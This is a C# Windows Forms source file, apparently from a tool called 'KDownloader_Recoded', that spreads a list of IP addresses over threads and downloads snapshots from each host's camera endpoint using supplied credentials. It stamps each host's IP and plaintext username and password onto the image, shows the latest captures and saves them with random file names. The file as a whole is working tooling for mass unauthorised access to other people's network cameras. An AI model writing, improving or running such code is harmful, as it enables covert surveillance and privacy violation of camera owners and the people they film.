using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text; 
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KDownloader_Recoded
{
    public partial class viewer : Form
    {
        public Random rnd = new Random();
        public int threadCount;
        public List<String> ipAddrs = new List<String> { };
        public int ipaCount = 0;
        public List<List<String>> seperatedIpList = new List<List<String>> { };
        public camData setCamData;
        public string imgdir = "";
        public string outdir = "";
        public Font luc = new Font("Lucida Console", 20);
        public int remoteSaveCounter = 0;
        public int remoteTestcounter = 0;
        
        public Bitmap sr0;
        public Bitmap sr1;
        public Bitmap sr2;
        public Bitmap sr3;
        public Bitmap sr4;

        public viewer(int threadCount, camData cdat, string imgdir, string outdir, List<String> ips)
        {
            InitializeComponent();
            this.threadCount = threadCount;
            this.setCamData = cdat;
            this.imgdir = imgdir;
            this.outdir = outdir;
            ipAddrs = ips;
        }

        public List<Bitmap> rollingBitmapDisplay = new List<Bitmap> { };

        private void viewer_Load(object sender, EventArgs e)
        {
            populateBlankImages();
            seperateAndSpawnThreads();
            ipaCount = ipAddrs.Count();
            progressLbl.Text = "Progress: 0/" + ipaCount;
            BarMain.Maximum = ipaCount;
        }

        public void seperateAndSpawnThreads()
        {
            threadCount++;

            //populate list with empty lists
            for(int i = 0; i < threadCount; i++)
            {
                seperatedIpList.Add(new List<string> { });
            }

            //add ip data to individual lists
            int extCount = 1;
            foreach (string s in ipAddrs)
            {
                extCount++;
                if(extCount == threadCount)
                {
                    extCount = 1;
                }
                seperatedIpList[extCount].Add(s);
            }

            int sanity = 0;
            //spawn threads
            for (int i = 1; i < threadCount; i++)
            {
                sanity += seperatedIpList[i].Count();
                Thread testing = new Thread(() => mainTestThread(i, seperatedIpList[i], setCamData, imgdir));
                testing.IsBackground = true;
                testing.Start();
                Thread.Sleep(500);
            }

            if(sanity == ipAddrs.Count())
            {
                Console.WriteLine("IP CHECK OK!");
            }

        }

        public void mainTestThread(int thrid, List<String> ips, camData cdat, string dir)
        {

            List<String> goodIps = new List<String> { };
            TimeWebClient wc = new TimeWebClient();
            wc.Credentials = cdat.Creds;
            Console.WriteLine("thread spawned: " + thrid + " with " + ips.Count + " ips ");

            foreach(string ip in ips)
            {
                //if the viewer form doesnt exist, exit the thread
                if (!this.IsHandleCreated)
                {
                    break;
                }

                remoteTestcounter++;
                this.Invoke(new MethodInvoker(delegate ()
                {
                    BarMain.Value = remoteTestcounter;
                    progressLbl.Text = "Progress: " + remoteTestcounter + "/" + ipaCount;
                }));
                try
                {           
                    string intIp = ip;

                    if (intIp.EndsWith(":"))
                    {
                        intIp = intIp.Substring(0, intIp.Length - 1);
                    }

                    Console.WriteLine("Thrid " + thrid + " testing " + intIp);

                    byte[] dlData = wc.DownloadData("http://" + intIp + cdat.Path);

                    

                    Bitmap bmp;
                    Graphics g;
                    using (var ms = new MemoryStream(dlData))
                    {
                        bmp = new Bitmap(ms);
                    }
                    g = Graphics.FromImage(bmp);

                    //entire chunk of mess for drawing the ip thing
                    String combinedCredsPT = cdat.Creds.UserName + " : " + cdat.Creds.Password;
                    SizeF sizeOfIp = g.MeasureString(intIp, luc);
                    SizeF sizeOfCreds = g.MeasureString(combinedCredsPT, luc);
                    int totalheight = (int)sizeOfIp.Height + (int)sizeOfCreds.Height;
                    int largerWidth;
                    if (sizeOfIp.Width > sizeOfCreds.Width)
                    {
                        largerWidth = (int)sizeOfIp.Width;
                    }
                    else
                    {
                        largerWidth = (int)sizeOfCreds.Width;
                    }
                    totalheight += 3;
                    largerWidth += 3;
                    g.FillRectangle(Brushes.Black, 0, 0, largerWidth, totalheight);
                    g.DrawString(intIp, luc, Brushes.White, new Point(1, 1));
                    g.DrawString(combinedCredsPT, luc, Brushes.White, new Point(1, 2 + (int)sizeOfIp.Height));

                    sr4 = sr3;
                    sr3 = sr2;
                    sr2 = sr1;
                    sr1 = sr0;
                    sr0 = bmp.Clone(new Rectangle(0, 0, bmp.Width, bmp.Height), PixelFormat.DontCare);

                    mainPB.Image = sr0;
                    subPBone.Image = sr1;
                    subPBtwo.Image = sr2;
                    subPBthree.Image = sr3;
                    subPBfour.Image = sr4;

                    remoteSaveCounter++;
                    int rscLen = remoteSaveCounter.ToString().Length;
                    string saveName = RandomString(5) + "_" + RandomString(10) + ".jpg";
                    Bitmap save = bmp.Clone(new Rectangle(0, 0, bmp.Width, bmp.Height), PixelFormat.DontCare);
                    save.Save(dir + "/" + saveName);

                    save.Dispose();
                    bmp.Dispose();
                    g.Dispose();
                    GC.Collect();
                }
                catch
                {

                }
            }
        }

        public void populateBlankImages()
        {
            Bitmap tm = new Bitmap(160, 85);
            Graphics tg = Graphics.FromImage(tm);
            tg.DrawRectangle(Pens.Black, 0, 0, 1, 1);
            sr0 = tm;
            sr1 = tm;
            sr2 = tm;
            sr3 = tm;
            sr4 = tm;
        }

        public string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rnd.Next(s.Length)]).ToArray());
        }

        public class TimeWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 2500;
                return req;
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            //e.Cancel = true;
        }

    }
}
